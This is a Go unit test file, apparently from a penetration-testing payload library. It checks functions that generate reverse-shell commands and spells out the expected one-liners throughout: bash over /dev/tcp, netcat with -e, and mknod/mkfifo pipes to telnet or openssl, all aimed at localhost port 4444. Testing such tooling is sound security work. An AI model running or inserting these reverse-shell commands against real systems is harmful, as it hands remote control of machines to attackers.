package payload

import (
	"strings"
	"testing"
)

func TestReverseShellBash(t *testing.T) {
	payload := ReverseShellBash("127.0.0.1", 4444)

	if payload != "bash -c 'bash &> /dev/tcp/127.0.0.1/4444 <&1'" {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestReverseShellNetcatGaping(t *testing.T) {
	payload := ReverseShellNetcatGaping("127.0.0.1", 4444)

	if payload != "nc 127.0.0.1 4444 -e /bin/sh" {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestReverseShellMknodTelnet(t *testing.T) {
	payload := ReverseShellMknodTelnet("127.0.0.1", 4444, true)

	// random element to this one so just look for the required bits
	if !strings.Contains(payload, "cd /tmp; mknod ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, " p; sh -i < ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, "2>&1 | telnet 127.0.0.1:4444") {
		t.Fatal(payload)
	}

	t.Log(payload)

	payload = ReverseShellMknodTelnet("127.0.0.1", 4444, false)
	if !strings.Contains(payload, "2>&1 | telnet 127.0.0.1 4444") {
		t.Fatal(payload)
	}
}

func TestReverseShellMkfifoTelnet(t *testing.T) {
	payload := ReverseShellMkfifoTelnet("127.0.0.1", 4444, true)

	// random element to this one so just look for the required bits
	if !strings.Contains(payload, "cd /tmp; mkfifo ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, "; telnet 127.0.0.1:4444 0<") {
		t.Fatal(payload)
	}

	t.Log(payload)

	payload = ReverseShellMkfifoTelnet("127.0.0.1", 4444, false)
	if !strings.Contains(payload, "; telnet 127.0.0.1 4444 0<") {
		t.Fatal(payload)
	}
}

func TestReverseShellMknodOpenSSL(t *testing.T) {
	payload := ReverseShellMknodOpenSSL("127.0.0.1", 4444)

	// random element to this one so just look for the required bits
	if !strings.Contains(payload, "cd /tmp; mknod ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, " p; sh -i < ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, "2>&1 | openssl s_client -quiet -connect 127.0.0.1:4444") {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestReverseShellMkfifoOpenSSL(t *testing.T) {
	payload := ReverseShellMkfifoOpenSSL("127.0.0.1", 4444)

	// random element to this one so just look for the required bits
	if !strings.Contains(payload, "cd /tmp; mkfifo ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, "; sh -i < ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, "2>&1 | openssl s_client -quiet -connect 127.0.0.1:4444") {
		t.Fatal(payload)
	}

	t.Log(payload)
}
